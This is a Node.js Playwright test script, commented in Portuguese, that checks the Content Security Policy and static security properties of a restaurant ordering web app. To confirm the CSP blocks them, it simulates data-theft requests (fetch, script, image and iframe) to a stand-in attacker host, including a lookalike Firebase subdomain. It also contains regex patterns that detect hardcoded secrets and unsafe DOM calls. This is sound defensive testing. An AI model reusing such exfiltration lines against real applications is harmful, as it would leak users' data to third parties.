// 1) A política CSP deixa passar o que o app precisa e bloqueia o resto. 2) Verificações estáticas dos arquivos finais.
const fs = require('fs'), path = require('path');
const { chromium } = require('playwright');
const ROOT = path.join(__dirname, '..');
let pass = 0, fail = 0;
const ok = (n, c, x) => { c ? pass++ : fail++; console.log((c ? 'OK   ' : 'FALHA') + ' ' + n + (x ? '  ' + x : '')); };

(async () => {
  const browser = await chromium.launch();
  for (const file of ['index.html', 'comanda_cliente.html']) {
    const page = await (await browser.newContext()).newPage();
    const viol = [];
    await page.exposeFunction('__viol', (u) => viol.push(u));
    await page.addInitScript(() => document.addEventListener('securitypolicyviolation', e => window.__viol(e.blockedURI + ' [' + e.violatedDirective + ']')));
    const loaded = [];
    await page.route(/^https?:\/\//, r => {
      const u = r.request().url();
      loaded.push(u);
      if (r.request().resourceType() === 'script') return r.fulfill({ contentType: 'application/javascript', body: '/* stub */' });
      if (r.request().resourceType() === 'stylesheet') return r.fulfill({ contentType: 'text/css', body: '' });
      return r.abort();
    });
    await page.goto('file://' + path.join(ROOT, file));
    await page.waitForTimeout(300);
    const cdnViol = viol.filter(v => /cdn\.|cdnjs|fonts\./.test(v));
    ok(`${file}: scripts/estilos dos CDNs usados pelo app NÃO são bloqueados pela CSP`, cdnViol.length === 0, cdnViol.join(', '));
    // tentativas que a CSP precisa barrar
    await page.evaluate(async () => {
      try { await fetch('https://atacante.example/roubo?x=1'); } catch (e) {}
      try { await fetch('https://smartcomanda-df58e-default-rtdb.firebaseio.com.atacante.example/x'); } catch (e) {}
      const s = document.createElement('script'); s.src = 'https://atacante.example/mal.js'; document.head.appendChild(s);
      const i = document.createElement('img'); i.src = 'https://atacante.example/pixel.png'; document.body.appendChild(i);
      const f = document.createElement('iframe'); f.src = 'https://atacante.example/'; document.body.appendChild(f);
    });
    await page.waitForTimeout(300);
    const bad = viol.filter(v => /atacante/.test(v));
    ok(`${file}: CSP bloqueia fetch, script, imagem e iframe para domínio externo (${bad.length} bloqueios)`, bad.length >= 5, bad.join(' | '));
    ok(`${file}: nenhuma requisição saiu para o domínio do atacante`, !loaded.some(u => /atacante/.test(u)));
    await page.close();
  }
  await browser.close();

  // ---- estáticos
  const idx = fs.readFileSync(path.join(ROOT, 'index.html'), 'utf8'), cli = fs.readFileSync(path.join(ROOT, 'comanda_cliente.html'), 'utf8');
  for (const [n, h] of [['index.html', idx], ['comanda_cliente.html', cli]]) {
    ok(`${n}: sem api.qrserver.com (nenhum dado de comanda vai para terceiros)`, !/qrserver/.test(h));
    ok(`${n}: nenhum recurso externo via http:// (só https)`, !/(src|href)="http:\/\//.test(h));
    ok(`${n}: Alpine/Tailwind com versão fixa (sem @3.x.x nem "latest")`, !/alpinejs@3\.x|chart\.js"|@latest/.test(h) && /alpinejs@3\.14\.9/.test(h) && /tailwindcss\.com\/3\.4\.17/.test(h));
    ok(`${n}: política CSP presente, com default-src 'none', object-src 'none' e base-uri 'none'`, /Content-Security-Policy/.test(h) && /default-src 'none'/.test(h) && /object-src 'none'/.test(h) && /base-uri 'none'/.test(h));
    const blank = (h.match(/<a [^>]*target="_blank"[^>]*>/g) || []);
    ok(`${n}: todos os ${blank.length} links target=_blank têm rel="noopener noreferrer"`, blank.every(a => /rel="noopener noreferrer"/.test(a)));
    ok(`${n}: sem x-html / innerHTML / eval / document.write`, !/x-html|innerHTML|outerHTML|insertAdjacentHTML|\beval\(|document\.write/.test(h));
    ok(`${n}: sem chave de API privada, senha ou token escritos no código`, !/(sk-[A-Za-z0-9]{20,}|BEGIN (RSA|PRIVATE)|database_secret|"?secret"?\s*[:=]\s*'[^']{8,})/i.test(h));
    ok(`${n}: moldura anti-iframe (clickjacking) presente`, /window\.top !== window\.self/.test(h));
  }
  ok('index.html: sem contas padrão (admin/1234, garcom, cozinha, caixa)', !/user: 'admin'|pin: '1234'/.test(idx));
  ok('index.html: não grava mais sessão/usuários no localStorage', !/localStorage\.setItem\('smartcomanda_(session|staff)_v8'/.test(idx));
  ok('index.html: wa.me só com dígitos (scDigits) em todos os links', !/wa\.me\/\$\{selectedEncomenda\?\.whatsapp\}/.test(idx) && (idx.match(/scDigits\(/g) || []).length >= 4);
  ok('app do cliente: não usa mais a "trava" apagável (sem DELETE em avaliacoes_sessao)', !/method: 'DELETE'/.test(cli));

  console.log(`\nResumo: ${pass} OK, ${fail} falha(s)`);
  process.exit(fail ? 1 : 0);
})();
